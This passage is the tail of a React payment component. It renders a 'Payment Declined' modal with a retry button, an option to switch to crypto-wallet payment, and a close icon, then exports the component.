                  <h3 className="text-2xl font-bold text-gray-800 mb-4">Payment Declined</h3>
                  <p className="text-gray-600 mb-8">{paymentResult.message}</p>
                  <div className="space-y-3">
                    <button
                      type="button"
                      onClick={closeModal}
                      className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-xl transition-colors"
                    >
                      Try Again
                    </button>
                    <button
                      type="button"
                      onClick={() => {
                        closeModal();
                        setActiveTab('crypto-wallet');
                      }}
                      className="w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-semibold py-3 px-6 rounded-xl transition-colors"
                    >
                      Try Crypto Payment Instead
                    </button>
                  </div>
                </div>
              )}
            </div>
            
            <button
              type="button"
              onClick={closeModal}
              className="absolute top-4 right-4 text-gray-400 hover:text-gray-600 transition-colors"
            >
              <FiX className="w-6 h-6" />
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default Payment;